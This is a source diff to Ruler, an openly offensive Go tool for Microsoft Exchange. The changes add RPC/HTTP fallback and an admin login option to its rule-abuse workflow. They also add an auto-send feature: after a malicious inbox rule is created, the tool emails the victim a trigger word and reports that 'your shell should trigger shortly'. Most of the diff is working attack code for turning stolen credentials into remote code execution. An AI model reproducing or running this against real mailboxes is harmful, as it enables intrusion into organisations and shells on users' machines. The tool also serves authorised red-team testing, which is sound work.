@@ -5,6 +5,7 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"time"
 
 	"github.com/sensepost/ruler/autodiscover"
 	"github.com/sensepost/ruler/mapi"
@@ -39,9 +40,50 @@ func sendMail() {
 	*/
 }
 
+func getMapiHttp(autoURLPtr string) *utils.AutodiscoverResp {
+	var resp *utils.AutodiscoverResp
+	var err error
+	fmt.Println("[*] Retrieving MAPI/HTTP info")
+	if autoURLPtr == "" {
+		resp, err = autodiscover.MAPIDiscover(config.Domain)
+	} else {
+		resp, err = autodiscover.MAPIDiscover(autoURLPtr)
+	}
+
+	if resp == nil || err != nil {
+		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
+	}
+	//check if the autodiscover service responded with an error
+	if resp.Response.Error != (utils.AutoError{}) {
+		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
+	}
+	return resp
+}
+
+func getRpcHttp(autoURLPtr string) *utils.AutodiscoverResp {
+	var resp *utils.AutodiscoverResp
+	var err error
+	fmt.Println("[*] Retrieving RPC/HTTP info")
+	if autoURLPtr == "" {
+		resp, err = autodiscover.Autodiscover(config.Domain)
+	} else {
+		resp, err = autodiscover.Autodiscover(autoURLPtr)
+	}
+
+	if resp == nil || err != nil {
+		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
+	}
+	//check if the autodiscover service responded with an error
+	if resp.Response.Error != (utils.AutoError{}) {
+		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
+	}
+	return resp
+}
+
 func main() {
 	domainPtr := flag.String("domain", "", "The target domain (usually the email address domain)")
 	checkOnly := flag.Bool("check", false, "Checks to see if we can login and MAPI/HTTP is available")
+	adminPtr := flag.Bool("admin", false, "Try login as an administrator")
 	userPtr := flag.String("user", "", "A valid username")
 	passPtr := flag.String("pass", "", "A valid password")
 	ruleName := flag.String("rule", "", "A name for our rule")
@@ -62,6 +104,7 @@ func main() {
 	verbosePtr := flag.Bool("v", false, "Be verbose, show failures")
 	conscPtr := flag.Int("attempts", 2, "Number of attempts before delay")
 	delayPtr := flag.Int("delay", 5, "Delay between attempts")
+	autoSendPtr := flag.Bool("send", false, "Autosend an email once the rule has been created")
 	//pwnPtr := flag.Bool("pwn", false, "Used in conjuction with --rule. This will send an email from the victim to themself to trigger the rule")
 	flag.Parse()
 
@@ -81,55 +124,42 @@ func main() {
 	config.Email = *emailPtr
 	config.Basic = *basicPtr
 	config.Insecure = *insecurePtr
+	config.Verbose = *verbosePtr
+	config.Admin = *adminPtr
+
 	autodiscover.SessionConfig = &config
 
 	var resp *utils.AutodiscoverResp
 	var err error
 
 	if *autodiscoverOnly == true {
-		if *autoURLPtr == "" {
-			resp, err = autodiscover.Autodiscover(config.Domain)
-		} else {
-			resp, err = autodiscover.Autodiscover(*autoURLPtr)
-		}
-		if err != nil {
-			exit(err)
-		} else {
-			fmt.Printf("[*] Autodiscover enabled and we could Authenticate.\nAutodiscover returned: %s", resp.Response.User)
-			os.Exit(0)
-		}
+
+		resp = getRpcHttp(*autoURLPtr)
+		fmt.Printf("[*] Autodiscover enabled and we could Authenticate.\nAutodiscover returned: %s", resp.Response.User)
+		os.Exit(0)
+
 	}
 
-	fmt.Println("[*] Retrieving MAPI info")
-	if *autoURLPtr == "" {
-		resp, err = autodiscover.MAPIDiscover(config.Domain)
-	} else {
-		resp, err = autodiscover.MAPIDiscover(*autoURLPtr)
-	}
-
-	if resp == nil {
-		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
-	}
-	if err != nil {
-		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
-	}
-	//check if the autodiscover service responded with an error
-	if resp.Response.Error != (utils.AutoError{}) {
-		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n	%s", resp.Response.Error.Message))
-	}
 	if *tcpPtr == false {
+		resp = getMapiHttp(*autoURLPtr)
 		mapiURL := mapi.ExtractMapiURL(resp)
 		if mapiURL == "" {
-			exit(fmt.Errorf("[x] No MAPI URL found. Exiting"))
+			//try RPC
+			fmt.Println("[x] No MAPI URL found. Trying RPC/HTTP")
+			resp = getRpcHttp(*autoURLPtr)
+			fmt.Println(resp.Response.Account.Protocol[0].Server)
+			mapi.Init(config, resp.Response.User.LegacyDN, "", mapi.RPC)
+			//exit(fmt.Errorf("[x] No MAPI URL found. Exiting"))
 		}
 		fmt.Println("[+] MAPI URL found: ", mapiURL)
 		if *checkOnly == true {
 			fmt.Println("[+] Authentication succeeded and MAPI/HTTP is available")
 			os.Exit(0)
 		}
-		//mapi.Init(config, resp.Response.User.LegacyDN, mapiURL, mapi.HTTP)
 		mapi.Init(config, resp.Response.User.LegacyDN, mapiURL, mapi.HTTP)
 	} else {
+		resp = getRpcHttp(*autoURLPtr)
+		fmt.Println(resp.Response.Account.Protocol[0].Server)
 		mapi.Init(config, resp.Response.User.LegacyDN, "", mapi.RPC)
 	}
 
@@ -138,9 +168,22 @@ func main() {
 		exit(err)
 	} else if logon.MailboxGUID != nil {
 		fmt.Println("[*] And we are authenticated")
-		fmt.Println("[+] Mailbox GUID: ", logon.MailboxGUID)
+		fmt.Printf("[+] Mailbox GUID: %x\n", logon.MailboxGUID)
 		fmt.Println("[*] Openning the Inbox")
-		mapi.GetFolder()
+
+		propertyTags := make([]mapi.PropertyTag, 8)
+		propertyTags[0] = mapi.PidTagParentFolderID
+		propertyTags[1] = mapi.PidTagAccess
+		propertyTags[2] = mapi.PidTagMemberName
+		propertyTags[3] = mapi.PidTagDefaultPostMessageClass
+		propertyTags[4] = mapi.PidTagDisplayName
+		propertyTags[5] = mapi.PidTagFolderType
+		propertyTags[6] = mapi.PidTagContentCount
+		propertyTags[7] = mapi.PidTagSubfolders
+
+		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox
+
+		//Display All rules
 		if *displayRules == true {
 			fmt.Println("[+] Retrieving Rules")
 			rules, err := mapi.DisplayRules()
@@ -153,6 +196,7 @@ func main() {
 			}
 			exit(nil)
 		}
+		//Delete A rule
 		if *delRule != "" {
 			ruleid, err1 := hex.DecodeString(*delRule)
 			if err1 != nil {
@@ -176,7 +220,8 @@ func main() {
 			}
 
 		}
-		//mapi.GetContentsTable()
+
+		//Create a new rule
 		if *ruleName != "" {
 			fmt.Println("[*] Adding Rule")
 			//delete message on delivery
@@ -195,6 +240,26 @@ func main() {
 			fmt.Printf("[+] Found %d rules\n", len(rules))
 			for _, v := range rules {
 				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
+			}
+
+			if *autoSendPtr == true {
+				fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
+				time.Sleep(time.Second * (time.Duration)(30))
+				fmt.Println("[*] Sending email")
+
+				_, er := mapi.GetFolder(mapi.OUTBOX, nil)
+				if er != nil {
+					exit(er)
+				}
+				_, er = mapi.SendMessage(*triggerWord)
+				if er != nil {
+					exit(er)
+				}
+				//mapi.ReleaseObject(0x00)
+				//mapi.SendMessage(message.MessageID)
+
+				fmt.Println("[*] Message sent, your shell should trigger shortly.")
+				exit(nil)
 			}
 			exit(nil)
 		}
